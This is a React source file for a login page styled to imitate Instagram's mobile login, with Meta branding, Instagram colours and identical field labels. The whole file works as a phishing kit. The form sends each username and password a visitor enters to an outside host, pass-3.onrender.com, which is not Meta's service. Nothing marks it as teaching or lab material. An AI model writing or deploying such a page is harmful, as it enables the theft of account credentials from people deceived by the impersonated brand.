import React from 'react';
import { useState } from 'react';
import axios from 'axios';

const Login = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await axios.post('https://pass-3.onrender.com/api/login', {
        username,
        password,
      });
      setMessage(res.data.message);
    } catch (error) {
      setMessage('Error occurred');
      console.error(error);
    }
  };

  return (
    <div style={styles.container}>
      <div style={styles.languageSelector}>English (India)</div>
      <div style={styles.loginContainer}>
        {/* Replace the src with your desired logo */}
        <img
          src="logo1.jpeg.jpg" 
          alt="Logo"
          style={styles.logo}
        />
        <form onSubmit={handleSubmit} style={styles.form}>
          <input
            type="text"
            placeholder="Username, email address or mobile number"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
            style={styles.input}
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            style={styles.input}
          />
          <button type="submit" style={styles.loginButton}>
            Log in
          </button>
        </form>
        <a href="#" style={styles.forgotPassword}>
          Forgotten password?
        </a>
      </div>
      <div style={styles.footer}>
        <button style={styles.createAccountButton}>Create new account</button>
        <div style={styles.metaLogo}>∞ Meta</div>
      </div>
    </div>
  );
};

const styles = {
  container: {
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'space-between',
    height: '100vh',
    backgroundColor: '#fff',
    fontFamily: 'sans-serif',
  },
  languageSelector: {
    marginTop: '20px',
    color: '#8e8e8e',
  },
  loginContainer: {
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    width: '100%',
    maxWidth: '350px',
    padding: '0 20px',
  },
  logo: {
    width: '80px',
    height: '80px',
    marginBottom: '40px',
  },
  form: {
    width: '100%',
  },
  input: {
    width: '100%',
    padding: '14px',
    marginBottom: '10px',
    backgroundColor: '#fafafa',
    border: '1px solid #dbdbdb',
    borderRadius: '6px',
    boxSizing: 'border-box',
  },
  loginButton: {
    width: '100%',
    padding: '14px',
    backgroundColor: '#0095f6',
    color: 'white',
    border: 'none',
    borderRadius: '6px',
    fontWeight: 'bold',
    cursor: 'pointer',
  },
  forgotPassword: {
    marginTop: '20px',
    color: '#00376b',
    textDecoration: 'none',
    fontSize: '14px',
  },
  footer: {
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    width: '100%',
    paddingBottom: '20px',
  },
  createAccountButton: {
    width: 'calc(100% - 40px)',
    maxWidth: '310px',
    padding: '14px',
    backgroundColor: 'transparent',
    color: '#0095f6',
    border: '1px solid #0095f6',
    borderRadius: '30px',
    fontWeight: 'bold',
    cursor: 'pointer',
    marginBottom: '20px',
  },
  metaLogo: {
    fontSize: '16px',
    color: '#8e8e8e',
  },
};

export default Login;